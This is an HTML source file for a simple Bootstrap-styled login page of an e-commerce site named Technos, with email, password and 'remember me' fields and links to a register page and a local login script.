<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.XYZ/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/all.css">
    <title>E-Commerce || Login Page</title>
</head>
<body>
    <header class="header bg-body-tertiary">
        <div class="container">
            <nav class="navbar navbar-expand-sm">
                <a href="index.html" class="navbar-brand">Technos<span>.</span></a>
                
            </nav>
        </div> 
    </header>
    
    <section class="section-form">
        <form>
            <div class="mb-3">
                <label for="email" class="form-label fw-semibold">Email address:</label>
                <input type="email" class="form-control" id="email" name="email">
                <p class="text-muted">Do you have an account? <a href="register.html">Register</a></p>
            </div>
            <div class="mb-3">
                <label for="pwd" class="form-label fw-semibold">Password:</label>
                <input type="password" class="form-control" id="pwd"name="pswd">
            </div>
            <div class="form-check mb-3">
                <label class="form-check-label fw-semibold">
                <input class="form-check-input" type="checkbox" name="remember"> Remember me
                </label>
            </div>
            <button type="submit" class="btn btn-primary" id="submit">Submit</button>
        </form>
    </section>
    
    <!-- <script src="js/script.js"></script> -->
    <script src="js/login.js"></script>
    <script src="https://cdn.jsdelivr.XYZ/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
